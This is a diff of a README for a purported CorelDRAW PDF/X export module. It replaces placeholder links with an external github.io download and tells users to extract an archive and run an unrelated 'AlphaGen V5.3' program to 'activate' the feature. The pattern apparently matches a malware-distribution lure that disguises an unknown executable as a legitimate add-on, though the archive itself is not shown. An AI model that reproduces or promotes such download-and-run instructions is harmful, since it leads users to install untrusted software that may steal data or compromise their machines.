@@ -2,13 +2,13 @@
 
 Export industry-standard PDF/X files directly from CorelDRAW for professional print production, packaging, and publishing workflows.
 
-[![Download](https://img.shields.io/badge/Download-PDFX_Export_Module-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-PDFX_Export_Module-blueviolet)](https://pdfx-export-module-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://pdfx-export-module-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate and configure PDF/X profiles  
 4. ✅ In CorelDRAW, go to `File > Publish to PDF`, then choose a PDF/X preset
